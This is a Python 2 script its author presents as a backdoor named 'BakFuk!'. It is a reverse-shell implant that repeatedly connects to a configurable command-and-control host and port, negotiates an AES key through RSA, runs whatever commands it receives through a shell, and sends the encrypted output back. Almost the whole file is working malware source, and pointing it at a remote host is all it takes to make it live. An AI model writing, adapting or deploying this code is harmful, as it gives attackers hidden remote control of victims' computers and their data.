#!/usr/bin/python
# BakFuk!
# Simple python backdoor 
# Made by Ragnax

from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
import sys
import os
import subprocess
import socket
import time
import binascii
import base64
import random
from Crypto import Random


def bin2hex(data):
    return binascii.hexlify(data)

def hex2bin(data):
    return binascii.unhexlify(data)


def random_str(length):
    return ''.join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_$!?+*#@") for _ in range(length))

delay = 1
host = '127.0.0.1'
port = 31337

def AES_encode(k, s):
    s = _pad(s)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(k, AES.MODE_CBC, iv)
    return base64.b64encode(iv + cipher.encrypt(s))

def AES_decode(k, c):
    data = base64.b64decode(c)
    iv = data[:AES.block_size]
    cipher = AES.new(k, AES.MODE_CBC, iv)
    return _unpad(cipher.decrypt(data[AES.block_size:]))

def _pad(s):
    return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)

def _unpad(s):
    return s[:-ord(s[len(s)-1:])]

random_gen = Random.new().read
local_rsa_key = RSA.generate(2048, random_gen)
local_rsa_pub_key = local_rsa_key.publickey()
local_rsa_pub_key_der = local_rsa_pub_key.exportKey('DER')

while True:
    time.sleep(delay)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        data=s.recv(2048)
        cc_rsa_pub_key_der = hex2bin(data)
        cc_rsa_pub_key = RSA.importKey(cc_rsa_pub_key_der)
        conn_secret = random_str(16)
        s.send(cc_rsa_pub_key.encrypt(conn_secret, 32)[0])
    except Exception, e:
        print e
        continue
    while True:
        try:
            data=s.recv(2048)
            data=AES_decode(conn_secret, data)
            print "r: %s" % data
            if not data:
                s.close()
                break
            data = data.split()
            if len(data):
                if data[0] == "exit":
                    s.close()
                    break
                else:
                    p=subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                    out = p.stdout.read() + p.stderr.read()
                    if out != '' or err != '':
                        s.send(AES_encode(conn_secret, str(out) + '\r\n'))
        except Exception, e:
            print e
            s.close()
            break
